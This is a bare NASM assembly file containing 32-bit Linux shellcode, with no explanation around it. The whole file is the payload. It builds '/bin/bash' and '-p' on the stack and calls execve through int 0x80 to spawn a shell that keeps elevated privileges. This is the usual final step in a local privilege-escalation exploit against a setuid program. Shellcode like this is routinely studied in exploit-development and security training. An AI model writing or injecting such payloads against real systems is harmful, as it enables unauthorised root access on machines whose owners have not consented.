BITS 32

section .text
global _start

_start:
	push 0xb
	push eax
	cdq
	push edx
	push 0x702d
	mov ecx, esp
	push edx
	push 0x68
	push   0x7361622f
	push   0x6e69622f
	mov    ebx,esp
	xor edx, edx
	push   edx
	push   ecx
	push   ebx
	mov    ecx,esp
	mov eax, 0xb
	int		0x80
